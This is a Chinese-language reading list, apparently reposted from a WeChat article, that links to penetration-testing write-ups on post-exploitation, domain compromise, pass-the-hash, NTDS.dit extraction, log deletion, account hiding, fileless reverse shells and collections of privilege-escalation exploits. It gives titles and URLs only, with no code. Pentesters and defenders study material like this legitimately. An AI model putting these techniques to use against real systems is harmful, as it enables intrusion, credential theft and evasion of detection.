>   https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=16655&highlight=Metasploit%E5%9F%9F%E6%B8%97

metasploit在后渗透中的作用

>   https://www.secpulse.com/archives/69766.html

Metasploit驰骋内网直取域管首级

>   https://www.anquanke.com/post/id/85518

Metasploit 「永恒之蓝」两种模块的利弊

>   https://www.bodkin.ren/index.php/archives/555/

一篇文章精通PowerShell Empire 2.3（上）

>   http://bobao.360.cn/learning/detail/4760.html

一篇文章精通PowerShell Empire 2.3（下）

>   http://bobao.360.cn/learning/detail/4761.html

Powershell攻击指南黑客后渗透之道系列——基础篇

>   https://www.anquanke.com/post/id/87976

Powershell攻击指南黑客后渗透之道系列——进阶利用

>   https://www.anquanke.com/post/id/88851

Powershell攻击指南黑客后渗透之道系列——实战篇

>   https://www.anquanke.com/post/id/89362

Windows环境下的信息收集

>   [https://mp.weixin.qq.com/s/37xtTdjVetMg5P1WaJvYvA](https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484666&idx=1&sn=4ce455c0144c7b1474625f541a868876&scene=21#wechat_redirect)

Windows渗透常用命令

>   http://www.myh0st.cn/index.php/archives/261/

渗透的本质是信息搜集（第一季）

>   http://blog.csdn.net/micropoor/article/details/79400904

后渗透攻防的信息收集

>   https://www.secpulse.com/archives/51527.html

域渗透基础简单信息收集 基础篇

>   https://xianzhi.aliyun.com/forum/topic/237/

Linux 机器的渗透测试命令备忘表

>   http://www.91ri.org/17575.html

黑客游走于企业windows内网的几种姿势

>   https://paper.tuisec.win/detail/4973d8fa7741cb3

内网渗透测试定位技术总结

>   http://www.mottoin.com/92978.html

内网渗透——网络环境的判断

>   https://paper.tuisec.win/detail/bc7c4b2c3145d47

渗透经验 | Windows下载远程Payload并执行代码的各种技巧

>   http://www.freebuf.com/articles/system/155147.html

渗透技巧——Windows系统远程桌面的多用户登录

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/

渗透技巧之隐藏自己的工具

>   https://github.com/tom0li/security_circle/blob/master/51122255581554.md

白名单下载恶意代码的一个技巧

>   https://github.com/tom0li/security_circle/blob/master/28511224554581.md

白名单下载恶意代码

>   https://github.com/tom0li/security_circle/blob/master/51288554228124.md

一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云

>   https://github.com/tom0li/security_circle/blob/master/15288418585142.md

渗透技巧——从github下载文件的多种方法

>   https://xianzhi.aliyun.com/forum/topic/1649/

渗透技巧——从Admin权限切换到System权限

>   http://www.4hou.com/technology/8814.html

渗透技巧——程序的降权启动

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/

强制通过VPN上网,VPN断线就断网

>   https://www.t00ls.net/articles-38739.html

ip代理工具shadowProxy-代理池

>   [https://mp.weixin.qq.com/s/ENjRuI5FZArtzV5H4LbJng](https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483772&idx=1&sn=3cd7a248ed99a2b437884c5d7abf7591&scene=21#wechat_redirect)

渗透技巧——Windows系统的帐户隐藏

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/

渗透技巧——”隐藏”注册表的更多测试

>   http://www.4hou.com/penetration/9132.html

渗透技巧——Windows日志的删除与绕过

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/

渗透技巧——Token窃取与利用

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/

域渗透——Pass The Hash的实现

>   https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/

域渗透——获得域控服务器的NTDS.dit文件

>   https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/

渗透技巧——获得Windows系统的远程桌面连接历史记录

>   https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/

渗透技巧 | Windows上传并执行恶意代码的N种姿势

>   https://mp.weixin.qq.com/s?__biz=MzUxOTYzMzU0NQ==&mid=2247483675&idx=1&sn=13cc49242df2b8cd7d08d4084af9621b&chksm=f9f7eefdce8067eba45e9fd4090f34703c2e101be06ae83dc7db53f24f343ab907545ab9d423&scene=21#wechat_redirect

域渗透——利用SYSVOL还原组策略中保存的密码

>   https://xianzhi.aliyun.com/forum/topic/1653/

Windows 日志攻防之攻击篇

>   https://threathunter.org/topic/593eb1bbb33ad233198afcfa

从活动目录中获取域管理员权限的6种方法

>   http://www.4hou.com/technology/4256.html

当服务器只开web服务并且防火墙不准服务器对外主动发起链接时

>   [https://mp.weixin.qq.com/s/W5npN8YiqG-RBoq2mTv_2g](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651064200&idx=4&sn=c0f18df9420ea45dc35783f402194703&scene=21#wechat_redirect)

3gstudent/Pentest-and-Development-Tips

>   https://github.com/3gstudent/Pentest-and-Development-Tips

渗透测试中常见的小TIPS总结和整理

>   http://avfisher.win/archives/100

内网渗透思路整理与工具使用

>   https://www.anquanke.com/post/id/85827

windows内网渗透杂谈

>   https://bl4ck.in/penetration/2017/03/20/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88.html

60字节 - 无文件渗透测试实验

>   https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html

关于windows的RDP连接记录

>   http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/

Rcoil内网渗透

>   http://rcoil.me/2017/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/

3389user无法添加

>   http://www.91ri.org/5866.html

win提权辅助tool

>   https://github.com/GDSSecurity/Windows-Exploit-Suggester/

详解Linux权限提升的攻击与防护

>   https://www.anquanke.com/post/id/98628

windows-kernel-exploits Windows平台提权漏洞集合

>   https://github.com/SecWiki/windows-kernel-exploits

linux-kernel-exploits Linux平台提权漏洞集合

>   https://github.com/SecWiki/linux-kernel-exploits

hash与票据

>   [https://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA](https://mp.weixin.qq.com/s?__biz=MzI0NTYwMDMzNA==&mid=2247484206&idx=1&sn=31ee99fbf38ced642e44aab698f802c0&scene=21#wechat_redirect)



---

原文链接: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247487491&idx=1&sn=270336c6cca79b4a4e5d777d41ce71b7&chksm=ec1e202bdb69a93dba0f48f973132958c95d86b2db2b6d70b8ddd1cbe41c187fa08ca4c0d9c6&mpshare=1&scene=23&srcid=0531CV9kBehjp4YNxrCvqxo7#rd